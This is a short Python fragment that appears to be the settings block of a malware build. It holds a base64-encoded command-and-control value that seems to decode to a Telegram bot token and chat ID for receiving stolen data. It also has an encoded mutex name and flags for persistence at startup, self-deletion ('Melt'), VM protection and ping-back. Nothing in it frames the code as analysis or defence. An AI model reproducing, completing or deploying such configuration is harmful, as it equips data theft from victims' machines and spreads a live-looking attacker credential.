...
class Settings:
    C2 = (1, base64.b64decode('NzUzMjg1OTA0MTpBQUc1RzRvWnNERGpOeUNxdlJkU3dxV1VLYm9BUG1vX1dpUSQ2OTE1MDIwNjMy').decode())
    Mutex = base64.b64decode('cXA2RUpwNFNiS05ONzBYcQ==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
